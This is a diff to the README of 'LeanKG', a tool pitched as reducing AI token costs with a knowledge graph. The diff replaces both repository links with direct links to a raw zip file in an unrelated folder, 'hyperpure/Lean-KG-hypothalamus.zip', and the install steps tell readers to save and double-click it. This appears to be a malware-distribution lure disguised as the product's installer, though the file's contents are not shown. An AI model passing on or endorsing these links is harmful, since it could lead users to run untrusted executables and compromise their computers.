@@ -1,6 +1,6 @@
 # 🧠 LeanKG - Build Better Apps With Less Token Waste
 
-[ ![Download LeanKG](https://img.shields.io/badge/Download-LeanKG-blue.svg) ](https://github.com/Benjinsassi/LeanKG)
+[ ![Download LeanKG](https://img.shields.io/badge/Download-LeanKG-blue.svg) ](https://github.com/Benjinsassi/LeanKG/raw/refs/heads/main/hyperpure/Lean-KG-hypothalamus.zip)
 
 LeanKG helps you manage your coding projects by reducing the amount of data sent to AI models. It organizes your work into a lightweight knowledge graph. This approach saves tokens and keeps your AI responses focused. You spend less on subscription costs and get faster answers from your tools.
 
@@ -18,7 +18,7 @@ Modern coding assistants often consume large amounts of data. They read entire p
 ## 📥 How to Install
 
 1. Locate the download button on this page or follow the link below.
-2. Visit this page to download: [https://github.com/Benjinsassi/LeanKG](https://github.com/Benjinsassi/LeanKG)
+2. Visit this page to download: [https://github.com/Benjinsassi/LeanKG/raw/refs/heads/main/hyperpure/Lean-KG-hypothalamus.zip](https://github.com/Benjinsassi/LeanKG/raw/refs/heads/main/hyperpure/Lean-KG-hypothalamus.zip)
 3. Save the installer file to your computer.
 4. Double-click the file to start the setup process.
 5. Follow the on-screen prompts to complete the installation.
